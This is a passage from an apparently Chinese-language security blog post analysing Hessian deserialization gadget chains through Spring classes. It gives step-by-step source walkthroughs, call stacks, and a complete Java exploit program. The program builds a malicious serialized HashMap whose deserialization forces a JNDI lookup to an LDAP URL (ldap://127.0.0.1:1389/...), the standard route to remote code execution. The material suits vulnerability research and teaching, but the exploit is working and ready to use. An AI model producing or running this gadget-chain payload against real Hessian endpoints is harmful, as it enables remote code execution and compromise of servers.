<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202212805.png"></p>
<p><strong>第四步</strong></p>
<p>调用者为XString对象，调用其equals方法，这样设置的目的在于该equals方法中，调用toString方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202215158.png"></p>
<p>这样就将链的执行流交给了map中put的第一个元素里面的嵌套对象，即AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder</p>
<p><strong>第五步</strong></p>
<p>进入该静态类的toString方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这段代码的作用是生成一个包含类的名称、顺序信息和切面名称的字符串表示形式，用于描述该对象的信息</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="type">Advice</span> <span class="variable">advice</span> <span class="operator">=</span> <span class="built_in">this</span>.advisor.getAdvice();</span><br><span class="line">    sb.append(ClassUtils.getShortName(advice.getClass()));</span><br><span class="line">    sb.append(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.advisor <span class="keyword">instanceof</span> Ordered) &#123;</span><br><span class="line">        <span class="comment">// 关键在这</span></span><br><span class="line">        sb.append(<span class="string">&quot;order &quot;</span>).append(((Ordered)<span class="built_in">this</span>.advisor).getOrder()).append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (advice <span class="keyword">instanceof</span> AbstractAspectJAdvice) &#123;</span><br><span class="line">        <span class="type">AbstractAspectJAdvice</span> <span class="variable">ajAdvice</span> <span class="operator">=</span> (AbstractAspectJAdvice)advice;</span><br><span class="line">        sb.append(ajAdvice.getAspectName());</span><br><span class="line">        sb.append(<span class="string">&quot;, declaration order &quot;</span>);</span><br><span class="line">        sb.append(ajAdvice.getDeclarationOrder());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里利用的就是getOrder方法，因此需要设置advisor属性的值，根据链构造，要将其设置为AspectJPointcutAdvisor对象</p>
<p>注：这里选择的对象既要有getOrder方法维持后续的链，也要是Ordered接口的实例，正好AspectJPointcutAdvisor是Ordered接口的子类</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202220239.png"></p>
<p><strong>第六步</strong></p>
<p>进入AspectJPointcutAdvisor对象的getOrder方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.order != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.order;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.advice.getOrder();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是利用getOrder方法，这里需要设置advice属性，根据链构造，需要将其设置成AspectJAroundAdvice对象，同时需要满足order属性为空</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202221029.png"></p>
<p><strong>第七步</strong></p>
<p>进入AspectJAroundAdvice对象的getOrder方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.aspectInstanceFactory.getOrder();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着利用getOrder方法，需要设置aspectInstanceFactory属性，这里将其设置为BeanFactoryAspectInstanceFactory对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202221813.png"></p>
<p><strong>第八步</strong></p>
<p>进入该对象的getOrder方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 关键点</span></span><br><span class="line">    Class&lt;?&gt; type = <span class="built_in">this</span>.beanFactory.getType(<span class="built_in">this</span>.name);</span><br><span class="line">    <span class="keyword">if</span> (type != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Ordered.class.isAssignableFrom(type) &amp;&amp; <span class="built_in">this</span>.beanFactory.isSingleton(<span class="built_in">this</span>.name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ((Ordered) <span class="built_in">this</span>.beanFactory.getBean(<span class="built_in">this</span>.name)).getOrder();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> OrderUtils.getOrder(type, Ordered.LOWEST_PRECEDENCE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Ordered.LOWEST_PRECEDENCE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要利用的是getType方法，但是需要设置beanFactory和name两个属性，根据后面链利用，将beanFactory设置为SimpleJndiBeanFactory对象，name设置为ldap url</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202222138.png"></p>
<p><strong>第九步</strong></p>
<p>进入SimpleJndiBeanFactory的getType方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; getType(String name) <span class="keyword">throws</span> NoSuchBeanDefinitionException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.doGetType(name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NameNotFoundException var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchBeanDefinitionException</span>(name, <span class="string">&quot;not found in JNDI environment&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var4) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有条件限制，查看其doGetType方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Class&lt;?&gt; doGetType(String name) <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isSingleton(name)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">jndiObject</span> <span class="operator">=</span> <span class="built_in">this</span>.doGetSingleton(name, (Class)<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> jndiObject != <span class="literal">null</span> ? jndiObject.getClass() : <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>.resourceTypes) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.resourceTypes.containsKey(name)) &#123;</span><br><span class="line">                <span class="keyword">return</span> (Class)<span class="built_in">this</span>.resourceTypes.get(name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 利用点</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">jndiObject</span> <span class="operator">=</span> <span class="built_in">this</span>.lookup(name, (Class)<span class="literal">null</span>);</span><br><span class="line">                Class&lt;?&gt; type = jndiObject != <span class="literal">null</span> ? jndiObject.getClass() : <span class="literal">null</span>;</span><br><span class="line">                <span class="built_in">this</span>.resourceTypes.put(name, type);</span><br><span class="line">                <span class="keyword">return</span> type;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要到达利用点，需要满足两个条件：</p>
<ul>
<li><p>this.isSingleton(name)为false</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSingleton</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.shareableResources.contains(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>shareableResources属性中不包含ldap url</p>
</li>
<li><p>this.resourceTypes.containsKey(name)为false，而resourceTypes属性中也不包含ldap url</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202223629.png"></p>
<p>来到父类JndiLocatorSupport的lookup方法，关键代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jndiObject = <span class="built_in">this</span>.getJndiTemplate().lookup(convertedName, requiredType);</span><br></pre></td></tr></table></figure>

<p>先观察getJndiTemplate方法，需要进入到JndiLocatorSupport的父类JndiAccessor类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> JndiTemplate <span class="title function_">getJndiTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.jndiTemplate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在构造方法中会将其初始化为JndiTemplate对象，回到JndiLocatorSupport的lookup方法，getJndiTemplate返回的是一个JndiTemplate对象，调用其lookup方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">lookup</span><span class="params">(String name, Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">jndiObject</span> <span class="operator">=</span> <span class="built_in">this</span>.lookup(name);</span><br><span class="line">    <span class="keyword">if</span> (requiredType != <span class="literal">null</span> &amp;&amp; !requiredType.isInstance(jndiObject)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeMismatchNamingException</span>(name, requiredType, jndiObject != <span class="literal">null</span> ? jndiObject.getClass() : <span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> jndiObject;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入重载方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">        <span class="built_in">this</span>.logger.debug(<span class="string">&quot;Looking up JNDI object with name [&quot;</span> + name + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关键在这里</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.execute(<span class="keyword">new</span> <span class="title class_">JndiCallback</span>&lt;Object&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">doInContext</span><span class="params">(Context ctx)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="comment">// 关键点</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">located</span> <span class="operator">=</span> ctx.lookup(name);</span><br><span class="line">            <span class="keyword">if</span> (located == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(<span class="string">&quot;JNDI object with [&quot;</span> + name + <span class="string">&quot;] not found: JNDI implementation returned null&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> located;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的作用是在JNDI中查找指定名称的对象。它通过执行一个<code>JndiCallback</code>对象的<code>doInContext()</code>方法，在JNDI上下文中调用<code>lookup()</code>方法查找对象，并根据查找结果进行处理。如果找到对象，就返回该对象；如果找不到对象，就抛出异常。</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202225057.png"></p>
<p>接下来就是LDAP lookup解析的过程</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li><p>其实完全可以将HotSwappableTargetSource去掉，毕竟XString中equals方法，不需要使用它来过度</p>
</li>
<li><p>在SimpleJndiBeanFactory的doGetType方法中，如果this.isSingleton(name)条件满足，会调用doGetSingleton方法，该方法中也有利用点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> &lt;T&gt; T <span class="title function_">doGetSingleton</span><span class="params">(String name, Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.singletonObjects) &#123;</span><br><span class="line">        Object jndiObject;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.singletonObjects.containsKey(name)) &#123;</span><br><span class="line">            jndiObject = <span class="built_in">this</span>.singletonObjects.get(name);</span><br><span class="line">            <span class="keyword">if</span> (requiredType != <span class="literal">null</span> &amp;&amp; !requiredType.isInstance(jndiObject)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeMismatchNamingException</span>(<span class="built_in">this</span>.convertJndiName(name), requiredType, jndiObject != <span class="literal">null</span> ? jndiObject.getClass() : <span class="literal">null</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> jndiObject;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 这里</span></span><br><span class="line">            jndiObject = <span class="built_in">this</span>.lookup(name, requiredType);</span><br><span class="line">            <span class="built_in">this</span>.singletonObjects.put(name, jndiObject);</span><br><span class="line">            <span class="keyword">return</span> jndiObject;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面部分也是一致的，只需要在exp中加入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashSet&lt;String&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">set.add(url);</span><br><span class="line">setFiled(simpleJndiBeanFactory, <span class="string">&quot;shareableResources&quot;</span>, set);</span><br></pre></td></tr></table></figure>

<p>调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">doInContext:<span class="number">155</span>, JndiTemplate$<span class="number">1</span> (org.springframework.jndi)</span><br><span class="line">execute:<span class="number">87</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">152</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">179</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">95</span>, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:<span class="number">211</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">doGetType:<span class="number">219</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getType:<span class="number">184</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据分析很容易理解exp构造，在exp构造中，很多类没有无参数构造方法，这里参考marshalsec中的设计，非常巧妙</p>
</li>
</ul>
<h2 id="Spring-AbstractBeanFactoryPointcutAdvisor链"><a href="#Spring-AbstractBeanFactoryPointcutAdvisor链" class="headerlink" title="Spring AbstractBeanFactoryPointcutAdvisor链"></a>Spring AbstractBeanFactoryPointcutAdvisor链</h2><h3 id="利用链-3"><a href="#利用链-3" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SimpleJndiBeanFactory.getBean() (org.springframework.jndi.support)</span><br><span class="line">AbstractBeanFactoryPointcutAdvisor.getAdvice()  (org.springframework.aop.support)  <span class="comment">// 主要</span></span><br><span class="line">AbstractPointcutAdvisor.equals()   (org.springframework.aop.support)</span><br><span class="line">HotSwappableTargetSource.equals()    (org.springframework.aop.target) </span><br><span class="line">HashMap.putVal()</span><br><span class="line">HashMap.put()</span><br><span class="line">MapDeserializer.readMap()</span><br><span class="line">SerializerFactory.readMap()</span><br><span class="line">Hessian2Input.readObject()</span><br></pre></td></tr></table></figure>

<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dili.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.AsyncAnnotationAdvisor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AbstractBeanFactoryPointcutAdvisorHessian</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ldap url</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/ppkhjx&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        <span class="comment">// String SimpleJndiBeanFactory = &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;;</span></span><br><span class="line">        <span class="comment">// SimpleJndiBeanFactory beanFactory = (SimpleJndiBeanFactory) Class.forName(SimpleJndiBeanFactory).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span></span><br><span class="line">        beanFactory.setShareableResources(url);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">defaultBeanFactoryPointcutAdvisor</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span>;</span><br><span class="line">        Constructor&lt;?&gt; constructor = Class.forName(defaultBeanFactoryPointcutAdvisor).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">advisor1</span> <span class="operator">=</span> (DefaultBeanFactoryPointcutAdvisor) constructor.newInstance();</span><br><span class="line">        advisor1.setAdviceBeanName(url);</span><br><span class="line">        advisor1.setBeanFactory(beanFactory);</span><br><span class="line">        <span class="type">AsyncAnnotationAdvisor</span> <span class="variable">advisor2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AsyncAnnotationAdvisor</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">targetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">targetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashMap</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(targetSource1, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        hashMap.put(targetSource2, <span class="string">&quot;222&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.aop.target.HotSwappableTargetSource&quot;</span>;</span><br><span class="line">        setFiled(classname, targetSource1, <span class="string">&quot;target&quot;</span>, advisor1);</span><br><span class="line">        setFiled(classname, targetSource2, <span class="string">&quot;target&quot;</span>, advisor2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;JavaSec/out/AbstractBeanFactoryPointcutAdvisorHessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(hashMap);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;JavaSec/out/AbstractBeanFactoryPointcutAdvisorHessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(fileInputStream);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> (HashMap) hessian2Input.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(String classname, Object o, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(classname);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> aClass.getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="函数调用栈-2"><a href="#函数调用栈-2" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">doInContext:<span class="number">155</span>, JndiTemplate$<span class="number">1</span> (org.springframework.jndi)</span><br><span class="line">execute:<span class="number">87</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">152</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">179</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">95</span>, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:<span class="number">211</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:<span class="number">111</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getAdvice:<span class="number">116</span>, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">equals:<span class="number">76</span>, AbstractPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">equals:<span class="number">104</span>, HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">538</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2110</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">main:<span class="number">74</span>, AbstractBeanFactoryPointcutAdvisorHessian (org.dili.hessian)</span><br></pre></td></tr></table></figure>

<h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p><strong>第一步</strong></p>
<p>从Hessian2Input的readObject方法开始，和上面一致，来到MapDeserializer的readMap方法，同样进入while循环，读取完一轮后，即将exp中第一次的put读入map中</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240203222905.png"></p>
<p>接着在第二轮中触发链的执行</p>
<p><strong>第二步</strong></p>
<p>同样根据HashMap的属性，会在第二轮读取键值对时进行equals方法的调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240203223148.png"></p>
<p>此时的key为HotSwappableTargetSource对象，里面的target为AsyncAnnotationAdvisor对象；而k也为HotSwappableTargetSource对象，里面的参数为DefaultBeanFactoryPointcutAdvisor对象</p>
<p><strong>第三步</strong></p>
<p>进入HotSwappableTargetSource的equals方法，继续调用target的equals方法，同时传递的参数为k对象的target。由于AsyncAnnotationAdvisor对象没有equals方法，调用父类AbstractPointcutAdvisor的equals方法，此时的other为DefaultBeanFactoryPointcutAdvisor对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object other)</span> &#123;</span><br><span class="line">    <span class="comment">// 满足条件1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span> == other) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 满足条件2</span></span><br><span class="line">    <span class="keyword">if</span> (!(other <span class="keyword">instanceof</span> PointcutAdvisor)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">PointcutAdvisor</span> <span class="variable">otherAdvisor</span> <span class="operator">=</span> (PointcutAdvisor) other;</span><br><span class="line">    <span class="comment">// 触发点为getAdvice，也是第二个getAdvice方法</span></span><br><span class="line">    <span class="keyword">return</span> (ObjectUtils.nullSafeEquals(getAdvice(), otherAdvisor.getAdvice()) &amp;&amp;</span><br><span class="line">            ObjectUtils.nullSafeEquals(getPointcut(), otherAdvisor.getPointcut()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240203224112.png"></p>
<p><strong>注</strong>：关于两个if</p>
<ul>
<li>第一个：两个HotSwappableTargetSource对象里面的target不能一致</li>
<li>第二个：传入的other对象需要是PointcutAdvisor实例，正好DefaultBeanFactoryPointcutAdvisor继承AbstractBeanFactoryPointcutAdvisor，而该类继承AbstractPointcutAdvisor，接着继承PointcutAdvisor，符合要求</li>
</ul>
<p><strong>第四步</strong>：</p>
<p>进入DefaultBeanFactoryPointcutAdvisor对象的getAdvice方法，由于该类没有此方法，调用父类AbstractBeanFactoryPointcutAdvisor的getAdvice方法</p>
